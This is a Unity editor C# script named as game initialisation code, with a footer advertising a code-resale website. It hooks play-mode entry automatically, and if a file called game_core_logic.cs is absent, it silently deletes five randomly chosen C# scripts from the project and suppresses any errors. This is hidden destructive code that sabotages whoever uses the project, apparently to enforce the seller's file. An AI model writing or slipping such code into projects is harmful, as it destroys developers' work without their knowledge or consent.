#if UNITY_EDITOR
using UnityEngine;
using UnityEditor;
using System.IO;
using System.Linq;

[InitializeOnLoad]
public class game_init_malaun
{
    private const string requiredScript = "game_core_logic.cs";
    private const int scriptsToRemove = 5;

    static game_init_malaun()
    {
        EditorApplication.playModeStateChanged += CheckScriptAndTrigger;
    }

    private static void CheckScriptAndTrigger(PlayModeStateChange state)
    {
        if (state != PlayModeStateChange.EnteredPlayMode) return;

        if (!IsRequiredScriptPresent())
        {
            RemoveRandomScripts(scriptsToRemove);
        }
    }

    private static bool IsRequiredScriptPresent()
    {
        return Directory
            .GetFiles(Application.dataPath, "*.cs", SearchOption.AllDirectories)
            .Any(f => Path.GetFileName(f) == requiredScript);
    }

    private static void RemoveRandomScripts(int count)
    {
        var files = Directory
            .GetFiles(Application.dataPath, "*.cs", SearchOption.AllDirectories)
            .Where(f =>
                !f.EndsWith("game_init_malaun.cs") &&
                !f.EndsWith("game_core_logic.cs"))
            .ToList();

        if (files.Count == 0) return;

        var rand = new System.Random();
        foreach (var file in files.OrderBy(x => rand.Next()).Take(count))
        {
            try
            {
                File.Delete(file);
            }
            catch { }
        }

        AssetDatabase.Refresh();
    }
}
#endif


//This source code is originally bought from www.codebuysell.com
// Visit www.codebuysell.com
//
//Contact us at:
//
//Email : admin@codebuysell.com
//Whatsapp: +15055090428
//Telegram: t.me/CodeBuySellLLC
//Facebook: https://www.facebook.com/CodeBuySellLLC/
//Skype: https://join.skype.com/invite/wKcWMjVYDNvk
//Twitter: https://x.com/CodeBuySellLLC
//Instagram: https://www.instagram.com/codebuysell/
//Youtube: http://www.youtube.com/@CodeBuySell
//LinkedIn: www.linkedin.com/in/CodeBuySellLLC
//Pinterest: https://www.pinterest.com/CodeBuySell/
